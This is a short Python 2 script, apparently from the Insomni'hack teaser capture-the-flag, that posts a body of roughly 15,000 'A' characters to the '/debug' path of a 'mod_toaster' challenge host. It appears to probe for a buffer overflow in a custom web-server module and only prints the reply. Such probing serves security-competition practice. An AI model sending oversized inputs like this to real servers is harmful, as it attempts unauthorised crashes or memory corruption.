#!/usr/bin/python
import urllib
import urllib2

HOST = "mod_toaster.teaser.insomnihack.ch"
PORT = 80
ADDR = (HOST, PORT)

content = "A" * 0x3bd9

headers = []
headers.append(("Connection", "keep-alive"))
# headers.append(("User-Agent", useragent))

opener = urllib2.build_opener()
opener.addheaders = headers

debug = "/debug"
URL = "http://" + HOST + debug
#URL = URL.ljust(0x400, 'A')

request = urllib2.Request(URL, content)

response = opener.open(request)
data = response.read()

print data
